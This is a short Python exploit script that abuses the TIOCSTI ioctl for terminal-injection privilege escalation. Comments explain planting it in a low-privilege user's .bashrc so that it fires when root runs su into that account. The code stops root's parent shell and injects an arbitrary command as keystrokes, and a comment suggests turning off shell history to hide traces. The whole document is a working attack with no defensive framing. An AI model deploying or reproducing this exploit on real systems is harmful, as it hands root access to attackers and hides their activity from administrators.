#!/usr/bin/env python3


# $ echo ./tioctsi.py >> ~/.bashrc
# as root $ su lowprivuser
# to clean up as user $ cmd = ' set +o history\n' + sys.argv[1] + '\nfg\nreset\n'

import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
        fcntl.ioctl(0, termios.TIOCSTI, char)
